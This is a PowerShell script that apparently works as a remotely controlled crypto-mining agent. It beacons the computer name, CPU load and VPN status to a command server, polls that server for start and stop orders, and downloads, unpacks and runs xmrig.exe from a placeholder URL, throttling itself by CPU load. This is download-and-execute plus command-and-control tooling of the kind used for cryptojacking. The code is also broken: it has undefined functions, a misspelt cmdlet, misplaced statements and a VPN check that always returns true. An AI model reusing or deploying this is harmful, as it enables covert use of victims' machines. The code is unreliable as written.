$SERVER = "https://mcontrol.vercel.app/"
$SYSTEM = $env:COMPUTERNAME

$TEMP_DIR = "$env:TEMP\worker_env"
$WORKER = $null
$CPU_LIMIT = 70

$BASE_DIR = "C:\soft"
$TEMP_DIR = "C:\soft\temp"
$MINER_EXE = "$TEMP_DIR\xmrig.exe"

function Get-CPU {
    (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
}

function Check-VPN {
 
    try {
$headers = @{
            "User-Agent" = "Mozilla/5.0"
        }

        $info = Invoke-RestMethod `
            -Uri "https://ipinfo.io/json" `
            -Headers $headers `
            -TimeoutSec 10

        $country = $info.country
        Write-Host "Info:$info.country"
        Write-Host "Public IP Country: $country"
        if ($WORKER -and $WORKER.HasExited) {
        Write-Host "Worker crashed. Restarting."
        Start-Worker
}

        if ($country -ne "IN") {
            return $true
        }
        else {
            return $true
        }
    }
     catch {
        Write-Host "VPN check failed: $($_.Exception.Message)"
        return $false
    }
}
function Send-Status($running,$cpu,$vpnStatus){
  
    $data = @{
        id = $SYSTEM
        running = $running
        cpu = [int]$cpu
        vpn = $vpnStatus
    } | ConvertTo-Json

Invoke-RestMethod `
 -Uri "https://mcontrol.vercel.app/api/status" `
 -Method POST `
 -ContentType "application/json" `
 -Body $data

}

function Get-Command {
    param ($SystemId  )
      Write-Host "Checking ID: $SystemId" 
      $cmd = Invoke-RestMethod ` -Uri     "https://mcontrol.vercel.app/api/command?id=$SystemId" ` -Method GET ` -ContentType "application/json" ` -ErrorAction Stop # Added to ensure catch block works 
          Write-Host "getcmd: $($cmd | ConvertTo-Json -Compress)"
   
 
    return $cmd.command
}

function mit([string]$command) {
# ======================
    # START MINING
    # ======================
    if ($command -eq "start") {
        Write-Host "now mi"
        # Ensure BASE directory exists
        if (!(Test-Path $BASE_DIR)) {
            Write-Host "Creating base directory C:\soft"
            New-Item -ItemType Directory -Path $BASE_DIR | Out-Null
        }

        # Ensure TEMP directory exists
        if (!(Test-Path $TEMP_DIR)) {
            Write-Host "Creating temp directory"
            New-Item -ItemType Directory -Path $TEMP_DIR | Out-Null
        }

        $zipFile = "$TEMP_DIR\mine.zip"
        $minerZipUrl = "https://yourserver.com/mine.zip"

        # Download mining package
        Write-Host "Downloading mining package..."
        Invoke-WebRequest `
            -Uri $minerZipUrl `
            -OutFile $zipFile `
            -UseBasicParsing

        # Extract mining package
        Write-Host "Extracting mining package..."
        Expand-Archive `
            -Path $zipFile `
            -DestinationPath $TEMP_DIR `
            -Force

        Remove-Item $zipFile -Force

        # Verify miner exists
        if (!(Test-Path $MINER_EXE)) {
            Write-Host "xmrig.exe not found!"
            return
        }

        # Start miner if not already running
        if (!$MINER_PROC) {

            Write-Host "Starting miner..."

            $global:MINER_PROC = Start-Process `
                -FilePath $MINER_EXE `
                -ArgumentList "--config=config.json --testnet" `
                -WorkingDirectory $TEMP_DIR `
                -PassThru
        }
    }
    Wite-Host "stopping"
    # ======================
    # STOP MINING
    # ======================
    elseif ($command -eq "stop") {

        Write-Host "Stopping miner..."

        if ($MINER_PROC) {
            Stop-Process -Id $MINER_PROC.Id -Force
            $global:MINER_PROC = $null
        }

        # Remove only temp folder
        if (Test-Path $TEMP_DIR) {
            Remove-Item $TEMP_DIR -Recurse -Force
        }

        Write-Host "Mining stopped and cleaned."
    }
}


function Swok{
    Write-Host "called me"

    # If worker already running, do nothing
    if ($WORKER) { return }

    # Mark worker as running
    $global:WORKER = $true

    # Call mining function with start signal
    Mit -Start $true
    Write-Host "Started"
    # Send running status to dashboard
    Send-Status $true
}

function Swnok {

    Write-Host "Sending stop signal..."

    # If not running, do nothing
    if (-not $WORKER) { return }

    # Call Mit with stop command
    Mit "stop"

    # Mark worker as stopped
    $global:WORKER = $null
}

while($true){

    $cpu = Get-CPU
    $cmd = Get-Command -SystemId $SYSTEM
    Write-Host "cnd $cmd cpu $cpu"
    if($cpu -gt $CPU_LIMIT){
        Stop-Worker
    }

    if($cmd -eq "start"){ Swok Write-Host ¨called start $cmd¨ }
    if($cmd -eq "stop"){ Swnok Write-Host "called stop $cmd"}

    $running = $WORKER -ne $null
    Write-Host "$running runn in wprker: $WRKER"

    #$vpnStatus = Check-VPN
    $vpnStatus = true    
    Send-Status $running $cpu $vpnStatus

    Start-Sleep 30
}
